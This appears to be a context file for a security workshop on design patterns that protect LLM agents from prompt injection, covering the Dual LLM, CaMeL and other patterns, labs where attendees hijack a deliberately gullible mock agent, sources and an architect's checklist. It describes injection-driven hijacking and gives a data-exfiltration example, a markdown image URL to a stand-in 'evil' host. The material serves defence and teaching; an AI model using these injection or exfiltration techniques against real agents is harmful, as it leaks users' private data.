# Workshop context: Design Patterns for Securing LLM Agents against Prompt Injections

> This file holds the full background for the workshop. Load it as context for an AI
> assistant, a co-presenter, or yourself before changing the code. It covers what
> we teach, which sources we rely on, and the rules the code follows.

## 1. What the workshop is

A hands-on Nullcon workshop. Attendees run small, readable Python programs, one per
design pattern from Beurer-Kellner et al. (2025). Each program shows:

1. an **unprotected agent** (`--naive`) being hijacked by a planted prompt injection, and
2. the **pattern** that stops (or contains) the same attack, plus what it still does *not* stop.

The core teaching idea is **"Assume the model is always fooled."** The offline mock
LLM obeys every injection it sees. A pattern only counts if the *system design* still
holds under that assumption. Better prompts, "please ignore injections" and AI
detectors are probabilistic. These patterns are structural.

Format roadmap:
1. Plain Python scripts (done)
2. Attack labs against each pattern, with defend tasks (done, `labs/`, attendee steps in `WORKSHOP_GUIDE.md`)
3. (dropped) Jupyter notebooks: the scripts and labs cover the same ground

### Lab mode ("you are the model")

`labs/run.py` plants the attendee's text in one attacker-writable slot (`shared/world.py: SLOTS`,
or the user's own message). `shared/lab.py` then hands every LLM call whose prompt contains that
text to the attendee, who types the reply. Calls the text never reached answer honestly (the
mock, with the planted text scrubbed). Free-text replies the attendee typed become tainted too;
schema-validated replies do not (Willison's verifiable-output exception). Goals in `labs/labs.py`
check only outcomes recorded by hooks (`email`, `rendered`, `trusted`, `reached`), never the
payload, so nothing is hardcoded to a particular attack. `--real` skips the takeover so a real
model reads the injection. `labs/selftest.py` pins which goals each pattern guarantees and which it does not.

## 2. Sources (read these)

| # | Source | Why it matters |
|---|--------|----------------|
| 1 | **Beurer-Kellner et al., "Design Patterns for Securing LLM Agents against Prompt Injections"** (2025). https://arxiv.org/abs/2506.08837 (PDF: https://arxiv.org/pdf/2506.08837) | The six patterns, 10 case studies, best practices. The backbone of the workshop. |
| 2 | **Simon Willison, "Design Patterns for Securing LLM Agents against Prompt Injections"** (13 Jun 2025). https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/ | Readable summary of #1. Calls action-selector an "LLM-modulated switch statement". |
| 3 | **Debenedetti et al., "Defeating Prompt Injections by Design" (CaMeL)** (2025). https://arxiv.org/abs/2503.18813 (PDF: https://arxiv.org/pdf/2503.18813) | Code-then-execute with capabilities, a custom interpreter and policies. Basis of `05/v2`. |
| 4 | **google-research/camel-prompt-injection**. https://github.com/google-research/camel-prompt-injection | Reference implementation of CaMeL (a research artifact, not production code). |
| 5 | **Simon Willison, "CaMeL offers a promising new direction for mitigating prompt injection attacks"** (11 Apr 2025). https://simonwillison.net/2025/Apr/11/camel/ | Explains the flaw in Dual LLM and how capabilities fix it. Basis of `04` demo B, then `05`. |
| 6 | **Simon Willison, "The Dual LLM pattern for building AI assistants that can resist prompt injection"** (25 Apr 2023). https://simonwillison.net/2023/Apr/25/dual-llm-pattern/ | Privileged LLM, quarantined LLM, controller, `$VAR` references. Basis of `04`. |
| 7 | **Simon Willison, "Prompt injection: What's the worst that can happen?"** (14 Apr 2023). https://simonwillison.net/2023/Apr/14/worst-that-can-happen/ | Rogue email assistant, exfiltration via links/images, indirect injection, search poisoning. Basis of `00`. |
| + | ReversecLabs, *design-patterns-for-securing-llm-agents-code-samples*. https://github.com/ReversecLabs/design-patterns-for-securing-llm-agents-code-samples | Prior art: Chainlit samples of the same six patterns. We used it as a reference for the "two versions" split only. Our scenarios and code are our own. |
| + | Simon Willison, "The lethal trifecta for AI agents" (Jun 2025). https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/ | Private data + untrusted content + an exfiltration channel. Framing for `00`. |
| + | Meta, "Agents Rule of Two" (31 Oct 2025). https://ai.meta.com/blog/practical-ai-agent-security/ | At most two of: untrusted input, sensitive data, state change or external comms. Otherwise, human in the loop. |
| + | Nasr, Carlini et al., "The Attacker Moves Second" (Oct 2025). https://arxiv.org/abs/2510.09023 | Adaptive attacks bypass 12 defenses, most above 90%. Evidence for the "why not detect" FAQ. |
| + | Costa et al., FIDES (Microsoft, May 2025). https://arxiv.org/abs/2505.23643, https://github.com/microsoft/fides | Information-flow control for agents, now in Microsoft Agent Framework. |
| + | Simon Willison, "Living dangerously with Claude" (Oct 2025). https://simonwillison.net/2025/Oct/22/living-dangerously-with-claude/ | Sandboxing and egress control as the answer to the exfiltration leg. |

## 3. The problem in one paragraph

LLMs cannot reliably tell instructions apart from data. Anything in the context window
can act as an instruction. When an agent reads untrusted content (email, web page,
shared doc, CFP abstract, calendar invite, tool output), the author of that content
can steer the agent. If the agent also has tools, this becomes a **confused deputy**:
the attacker acts with the user's privileges (Willison 2023). It gets worst with the
trifecta of private data, untrusted input and a way out: send_email, HTTP calls, or
even a markdown image whose URL carries data (`![x](https://evil/?d=secret)`).
"There are plenty of 95% effective solutions ... That 5% is the problem" (Willison 2023).
**TO VERIFY** against the original post before using it on a slide. Known-good alternatives:
"in application security 99% is a failing grade" (Willison, CaMeL post, Apr 2025), and the
trifecta post's point that guardrails claiming 95% detection are a failing grade.

Guiding principle of the paper: **"once an LLM agent has ingested untrusted input, it
must be constrained so that it is impossible for that input to trigger any
consequential actions."**

## 4. The six patterns (and where they live in this repo)

| Pattern | Paper's definition (short) | Guarantee | Does NOT stop | Repo |
|---|---|---|---|---|
| **Action-Selector** | The LLM translates a request into one of a fixed set of actions. "Prevent any feedback from these actions back into the agent." Optionally templated actions with parameters. | Untrusted data never reaches an LLM that picks actions. | Showing untrusted text to the user. Very limited utility. | `01_action_selector/v1_switch.py` (pure switch), `v2_templated.py` (code-validated params) |
| **Plan-Then-Execute** | Fix the list of tool calls before any untrusted data is seen. A kind of control-flow integrity. | Injected text cannot add, remove or reorder tool calls, or change a recipient fixed in the plan. | Poisoned **arguments/content** (e.g. the email body). Injections in the user prompt. | `02_plan_then_execute/agent.py` |
| **LLM Map-Reduce** | An isolated sub-agent processes each untrusted item (map). Results are aggregated safely (reduce), ideally by code, with constrained outputs. | One malicious item can only affect its own record, within the schema. | That item's own result can still be gamed. | `03_llm_map_reduce/agent.py` |
| **Dual LLM** | A privileged LLM plans and has tools but never sees untrusted data. A quarantined LLM reads untrusted data with no tools. A controller (plain code) holds `$VAR` values. | The P-LLM's decisions can't be hijacked. The Q-LLM can't call tools. | **Data-flow** hijack: a Q-LLM result (e.g. an email address) flows into a tool argument (CaMeL's critique). | `04_dual_llm/agent.py` (demo A works, demo B shows the flaw) |
| **Code-Then-Execute** | The P-LLM writes a program (tools + Q-LLM calls) that then runs on the data. CaMeL adds capabilities and policies. | v1: fixed control flow. v2: plus data-flow control, so data only goes where its capabilities and policies allow. | Side channels (partly), phishing text shown to users, the cost of writing policies. | `05_code_then_execute/v1_plain.py`, `v2_provenance.py` |
| **Context-Minimization** | Remove unnecessary content (notably the user's prompt) from the context before later steps. | An injection in the user prompt cannot reach the step that writes the answer. | Whatever is left in context (the "strong" variant also removes intermediate summaries). | `06_context_minimization/agent.py` |

`00_baseline_naive_agent/agent.py` is the "before" picture: a ReAct-style agent with the full trifecta.

`07_quarantined_llm/agent.py` focuses on the quarantined LLM: separate P-LLM and Q-LLM models (`QLLM_MODEL`), schema-verified Q-LLM output that may reach the P-LLM (Willison's "verifiable output" exception), free text kept behind `$SUMMARY_<id>`, and an audit of `shared.llm.TRANSCRIPT` proving the P-LLM (and its provider) never saw email text or the reset code. This is CaMeL's privacy bonus.

### Paper's case studies (Sec. 4)
OS Assistant, SQL Agent, Email & Calendar Assistant, Customer Service Chatbot, Booking
Assistant, Product Recommender, Resume Screening Assistant, Medication Leaflet Chatbot,
Medical Diagnosis Chatbot, Software Engineering Agent. Our demos follow these:
email/calendar (00, 02, 04, 05), customer service (01, 06), and screening (03, using
CFP review in place of resumes or invoices).

### Best practices from the paper (Appendix A)
Action sandboxing (least privilege per action and user), user confirmation for
consequential actions, data/prompt formatting, and the reminder that "traditional"
security still applies. Pair patterns with these. They do not replace them.

## 5. CaMeL in detail (because `05/v2` implements it)

- **P-LLM** turns the user query into code (restricted Python). It never sees tool output.
- **Q-LLM** parses untrusted data into structured values. It has no tools. It can be a
  smaller or local model, which gives a privacy bonus: the P-LLM provider never sees your data.
- **Custom interpreter**: parses with Python's `ast` and interprets node by node (no `exec`).
- **Capabilities** are attached to every value:
  - *sources* (provenance): User for literals, CaMeL, or a tool plus an "inner source" such as an email's sender
  - *readers*: Public, or a set of principals
  - Combining values unions the sources and intersects the readers.
- **Data-flow graph**: `c = a + b` means c depends on a and b. Policies check a value together with all its dependencies.
- **Security policies**: Python functions run before each tool call, e.g. "send_email only if the recipient is trusted / is a reader of the data". Deny, or ask the user.
- **STRICT vs NORMAL mode**: in STRICT, statements inside `if`/`for` depend on the test or iterable, and statements after a Q-LLM call depend on its inputs. This defends against control-flow side channels (Sec. 7).
- **Results**: 77% of AgentDojo tasks solved with provable security, against 84% undefended.
  Gemini 2.5 Pro: 163 successful attacks undefended, 0 with CaMeL (out of 949, Table 4,
  arXiv 2503.18813 v2). Gemini 2.5 Flash: 297 to 1.
- **Limits** (Sec. 7 to 9): side channels (timing, indirect inference), "ROP-like" chaining of allowed
  blocks, the burden of writing and maintaining policies, and phishing via displayed text. Willison: the
  "first credible prompt injection mitigation I've seen that doesn't just throw more AI at the problem".

Our implementation (`05_code_then_execute/`):
- `capabilities.py`: Capabilities, Value, derive, dependency_tree
- `interpreter.py`: the AST interpreter, STRICT/NORMAL modes, policy hook
- `policies.py`: deny-by-default; send_email = readers check, then ask if the recipient came from the user, else deny.
  This order is deliberately stricter than the CaMeL reference, which allows user-sourced
  recipients outright and runs the readers check only otherwise.
- `selftest.py`: asserts covering taint spread, readers, block/allow, the STRICT side channel, and syntax rejection

## 6. Dual LLM rules (Willison 2023)

- The P-LLM accepts input only from trusted sources (the user) and has tools.
- The Q-LLM handles untrusted content and has no tools. Assume it "can go rogue at any moment".
- Unfiltered Q-LLM output must **never** reach the P-LLM. The exception is verifiable output, such as a fixed category set.
- The controller (plain software) stores `$VARn`, substitutes values for tools, Q-LLM and display. The values behind each `$VAR` are never seen by the P-LLM.
- Still vulnerable to social engineering of the user, and to chained outputs. Treat everything the Q-LLM produces as radioactive.
- Exfiltration hygiene: only allow links/images to an allowlist of domains (`shared/ui.py: render_for_user`).

## 7. Repo map and conventions

```
shared/llm.py       OpenAI-compatible client (default NVIDIA API), chat() / chat_json(pydantic), TRANSCRIPT of every call
shared/mock_llm.py  offline gullible model, scripted per `purpose` label
shared/world.py     fake RubixCON world + planted INJECTION_* payloads + tools
shared/ui.py        green=trusted, red=UNTRUSTED, yellow=tool, cyan=LLM; link allowlist; CLI flags
shared/react.py     the naive ReAct loop used by every --naive mode
shared/lab.py       lab mode: taint tracking, attacker takeover, event log (hooks in llm.py, world.py, ui.py)
0X_*/               one folder per pattern, each with a README and runnable scripts
labs/               run.py (runner), labs.py (catalogue + goal checks), camel_playground.py, selftest.py, solutions/
```

Conventions:
- No agent frameworks. Plain Python and pydantic, readable on a projector.
- Each script docstring has: the paper quote, how it works, the guarantee, what it does NOT stop, refs, and how to run it.
- Every LLM call has a `purpose` label. Adding a new LLM call means adding a mock responder in `shared/mock_llm.py`.
- Structured output uses JSON plus pydantic validation, one retry, then **fail closed** (`LLMOutputError`).
- Security checks live in **code** (validators, policies, allowlists), never in prompts.
- Flags: `--naive` (unprotected comparison), `--clean` (no injections, shows utility), `--ask "..."` (your own input). `VERBOSE=1` prints full prompts.
- Fake domains only (`*.example`). The attacker is `attacker@evil.example`.

## 8. LLM backend

Any OpenAI-compatible endpoint, configured in `.env`:
- NVIDIA API (default): `LLM_BASE_URL=https://integrate.api.nvidia.com/v1`, key `nvapi-...` from https://build.nvidia.com, model e.g. `nvidia/nemotron-3-ultra-550b-a55b` with reasoning off via `LLM_EXTRA_BODY` (see `.env.example`). The catalog changes often; check it the week before.
- Ollama: `http://localhost:11434/v1`. OpenRouter, Groq and OpenAI also work.
- `QLLM_MODEL` / `QLLM_BASE_URL` / `QLLM_API_KEY` set a separate (smaller or local) quarantined model.
- No key, or `MOCK_LLM=1`, uses the offline mock.
- **In the room, default everyone to `MOCK_LLM=1`.** Live models are optional: free tiers will
  rate-limit 40 to 60 attendees, and a 70B model may write unreliable restricted Python for `05`.

## 9. Talking points / FAQ

- *"Why not just detect injections with another LLM?"* Detection is probabilistic, and adversaries look for the 5% it misses. "The Attacker Moves Second" (Nasr, Carlini et al. 2025) bypassed 12 published defenses with adaptive attacks, most at above 90% success. These patterns give guarantees by construction.
- *"Do patterns kill utility?"* Some do (action-selector). The trade-off between utility and security is the paper's main axis. `--clean` shows each pattern still does the job.
- *"Is CaMeL solved prompt injection?"* No (Sec. 9.3 in v2, Sec. 8.3 in v1). It is a strong design for control and data flow, with known limits. See section 10.
- *"What about the user being the attacker?"* That is pattern 06, or a user pasting attacker text. Patterns 01 to 05 assume a trusted user.

## 10. After CaMeL: what auto mode still needs

CaMeL controls data flow, but every policy hit means "ask the user". In auto mode nobody is
there, so a denial becomes a failed task, and anything the policy allows passes even when the
attacker shaped its content.

| Gap left after CaMeL in auto mode | Example | Pattern that closes it |
|---|---|---|
| Denials with no human to approve | Recipient extracted from a doc, policy denies, task dies | Action-Selector at the sink (recipients only from a fixed contact list). Rule of Two: if all three legs are needed, it is not autonomous |
| Allowed flows carrying manipulated content | Poisoned summary or link emailed to a trusted colleague | Context-Minimization plus constrained outputs (enums, numbers, fixed fields, no free text or URLs) |
| Many untrusted items processed together | Inbox triage, invoice sorting | LLM Map-Reduce, aggregated by plain code |
| "Do what this email says" tasks | TODO list sent by email | Plan-Then-Execute over a predeclared action set, or human in the loop. Paper: cannot be made safe autonomously |
| Side channels | Loop or exception leaking one bit | CaMeL STRICT mode |
| Q-LLM still sees sensitive data | Q-LLM reads a private file to extract a field | Context-Minimization, least-privilege tool scopes |

The paper closes with two recommendations: **build application-specific agents**, and
**combine patterns**, because no single one suffices.

## 11. Containment (slide, no folder)

Sandboxing (OS sandbox, gVisor, microVMs) plus egress allowlists limits exfiltration through
code execution and raw network access. It does nothing when an injected agent misuses a granted
tool such as `send_email`. That gap is why patterns 01 to 06 exist.

## 12. Run of show

Full hands-on session (about 3 hours with a break): follow `WORKSHOP_GUIDE.md` module by module
(watch, hack, defend). Facilitator notes: the strongest live moment is Lab 05, v1 attack then
`--replay labs/attempts/lab05-v1.json --target v2`. Reference attacks and tested defences are in
`labs/solutions/`.

### 90 minute version (labs 00/02/04/05 hands-on, the rest as demos)

Matches the short path at the end of `WORKSHOP_GUIDE.md`. Setup happens before the session.

| Min | Module | Mode |
|---|---|---|
| 5 | Intro: assume the model is always fooled; lab rules | Live |
| 12 | 00 baseline demo, then Lab 00 | Demo + hands-on |
| 15 | 02 plan-then-execute demo, then Lab 02 (pattern, then `--naive`) | Demo + hands-on |
| 15 | 04 dual LLM demo, then Lab 04 | Demo + hands-on |
| 25 | 05 v1/v2 demo, Lab 05 v1 then replay on v2, playground mission 3 (STRICT vs NORMAL) | Demo + hands-on |
| 8 | 01, 03, 06, 07 as quick demos; After-CaMeL gaps + containment slide | Live |
| 10 | Architect's checklist, Q&A | Live |
| - | Labs 01, 03, 06, 07, defend tasks, playground missions 1, 2, 4 | Take-home |

Cut order if behind: the playground mission, then the containment slide down to one line.

## 13. Architect's checklist

- List every untrusted input, including tool descriptions and retrieved docs.
- Mark tools that touch private data and tools that change state or communicate externally.
- If one session needs all three, redesign or add a human.
- Pick the least powerful pattern that still does the job.
- Make every value returning from untrusted processing an enum, number or fixed field.
- Put deterministic policies at every sink; never let a model widen them.
- Sandbox code execution and allowlist egress.
- Test with adaptive attacks, not a static payload list.
